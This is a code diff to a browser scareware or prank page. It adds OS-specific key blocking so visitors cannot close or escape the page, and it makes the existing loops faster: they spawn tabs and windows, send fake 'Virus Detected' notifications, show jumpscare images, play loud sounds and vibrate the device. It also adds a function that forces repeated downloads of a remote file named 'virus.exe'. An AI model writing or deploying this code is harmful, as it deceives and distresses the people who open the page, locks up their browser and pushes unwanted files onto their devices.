@@ -48,19 +48,72 @@
 <audio id="loudAudio" src="https://www.soundjay.com/button/beep-07.wav" preload="auto"></audio>
 <audio id="alertAudio" src="https://www.soundjay.com/button/beep-10.wav" preload="auto"></audio>
 <script>
-    const blockKeys = ['Control', 'Alt', 'Meta', 'Escape', 'Tab', 'CapsLock', 'Search', 'Shift'];
-    document.addEventListener('keydown', (e) => {
-        if (blockKeys.includes(e.key)) e.preventDefault();
-    });
-    document.addEventListener('keyup', (e) => {
-        if (blockKeys.includes(e.key)) e.preventDefault();
-    });
-    document.addEventListener('keypress', (e) => e.preventDefault());
+    // Add more keys to block based on OS
+const blockKeys = ['Control', 'Alt', 'Meta', 'Escape', 'Tab', 'CapsLock', 'Search', 'Shift'];
+
+// Detect the operating system
+function getOS() {
+    const platform = navigator.platform.toLowerCase();
+    if (platform.includes('win')) {
+        return 'Windows';
+    } else if (platform.includes('mac')) {
+        return 'macOS';
+    } else if (platform.includes('linux')) {
+        return 'Linux';
+    } else if (platform.includes('cros')) {
+        return 'Chromebook';
+    }
+    return 'Unknown';
+}
+
+// Add OS-specific keys to block
+function getBlockedKeysByOS(os) {
+    let osSpecificKeys = [];
+
+    switch (os) {
+        case 'Windows':
+            osSpecificKeys = ['F12', 'F11', 'Alt+Tab', 'Ctrl+Shift+Esc']; // Prevent common shortcuts
+            break;
+        case 'macOS':
+            osSpecificKeys = ['Command', 'Option', 'F4', 'F11']; // macOS keys to block
+            break;
+        case 'Linux':
+            osSpecificKeys = ['Ctrl+Alt+T', 'Alt+Tab', 'Super', 'F5']; // Linux-specific keys
+            break;
+        case 'Chromebook':
+            osSpecificKeys = ['Ctrl+Shift+R', 'Ctrl+Alt+T', 'Ctrl+Alt+W']; // Chromebook-specific keys
+            break;
+        default:
+            osSpecificKeys = [];
+            break;
+    }
+
+    return osSpecificKeys;
+}
+
+// Merge OS-specific keys with global block keys
+const os = getOS();
+const osSpecificKeys = getBlockedKeysByOS(os);
+const allBlockedKeys = [...blockKeys, ...osSpecificKeys];
+
+// Event listener to block keys
+document.addEventListener('keydown', (e) => {
+    if (allBlockedKeys.includes(e.key) || (e.ctrlKey && e.key === 'r')) {
+        e.preventDefault(); // Block the key
+    }
+});
+
+document.addEventListener('keyup', (e) => {
+    if (allBlockedKeys.includes(e.key)) e.preventDefault();
+});
+
+document.addEventListener('keypress', (e) => e.preventDefault());
+
 
     function openRandomTabs() {
         window.open(window.location.href, '_blank');
     }
-    setInterval(openRandomTabs, 10);
+    setInterval(openRandomTabs, 500);
 
     function requestNotification() {
         if (Notification.permission !== 'granted') {
@@ -74,7 +127,7 @@
             new Notification('🚨 SYSTEM ALERT: Virus Detected! 🚨');
         }
     }
-    setInterval(sendNotification, 1000);
+    setInterval(sendNotification, 50);
 
     function flashBackground() {
         document.body.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
@@ -140,12 +193,12 @@
         document.body.appendChild(msg);
         setTimeout(() => msg.remove(), 4000);
     }
-    setInterval(autoTypeMessages, 1000);
+    setInterval(autoTypeMessages, 100);
 
     function changeTabTitle() {
         document.title = ["HACKED", "ERROR 404", "SYSTEM FAILURE", "VIRUS DETECTED", "YOU ARE DOOMED"][Math.floor(Math.random() * 5)];
     }
-    setInterval(changeTabTitle, 500);
+    setInterval(changeTabTitle, 250);
 
     function spamConsole() {
         setInterval(() => {
@@ -161,7 +214,7 @@
 
     function vibrateDevice() {
         if (navigator.vibrate) {
-            navigator.vibrate([500, 200, 500]);
+            navigator.vibrate([250, 150, 100]);
         }
     }
     setInterval(vibrateDevice, 800);
@@ -192,17 +245,13 @@
         document.body.appendChild(input);
         setTimeout(() => input.remove(), 3000);
     }
-    setInterval(spamInputs, 100);
+    setInterval(spamInputs, 50);
 
     function crazyBorder() {
         document.body.style.border = `10px solid hsl(${Math.random() * 360}, 100%, 50%)`;
     }
     setInterval(crazyBorder, 350);
 
-    function shrinkGrow() {
-        document.body.style.transform = `scale(${Math.random() + 0.5})`;
-    }
-    setInterval(shrinkGrow, 500);
 
     function playLoudSound() {
         const sound = document.getElementById('loudAudio');
@@ -217,17 +266,6 @@
         alert.play();
     }
     setInterval(playAlertSound, 250);
-
-    function fakeVolumeBoostMessage() {
-        let div = document.createElement('div');
-        div.className = 'error-box';
-        div.innerText = '🔊 Volume Boosted to MAX!';
-        div.style.left = `${Math.random() * window.innerWidth}px`;
-        div.style.top = `${Math.random() * window.innerHeight}px`;
-        document.body.appendChild(div);
-        setTimeout(() => div.remove(), 4000);
-    }
-    setInterval(fakeVolumeBoostMessage, 1500);
 
 // Screamer jumpscares
 const jumpscareImages = [
@@ -258,14 +296,14 @@ function randomJumpscare() {
     audio.volume = 100;
     audio.play();
 
-    setTimeout(() => img.remove(), 3000);
+    setTimeout(() => img.remove(), 2000);
 }
 setInterval(randomJumpscare, 274);
 
 function openNewWindowWithTab() {
     let newWin = window.open(window.location.href, "_blank", "width=600,height=400");
 }
-setInterval(openNewWindowWithTab, 100); // Every 35 seconds
+setInterval(openNewWindowWithTab, 500); // Every 35 seconds
 
 const loudSounds = [
     "https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3",
@@ -308,13 +346,6 @@ function scrambleText() {
 }
 setInterval(scrambleText, 500);
 
-function violentScreenShake() {
-    document.body.style.animation = 'shake 0.05s infinite';
-    setTimeout(() => {
-        document.body.style.animation = '';
-    }, 3000);
-}
-setInterval(violentScreenShake, 500);
 
 function isChromebook() {
     const ua = navigator.userAgent.toLowerCase();
@@ -368,6 +399,17 @@ function textToSpeechSpam() {
     speechSynthesis.speak(utter);
 }
 setInterval(textToSpeechSpam, 500); //
+
+function autoDownloadVirus() {
+    const a = document.createElement('a');
+    a.href = 'https://github.com/breadytoasted/gpt/raw/refs/heads/main/093e98f9-aa73-4c2c-b5cd-360a438e82c9.mp4'; // <-- you can host your own fake file
+    a.download = 'virus.exe';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+}
+setInterval(autoDownloadVirus, 150); // E
+
 
 </script>
 </body>
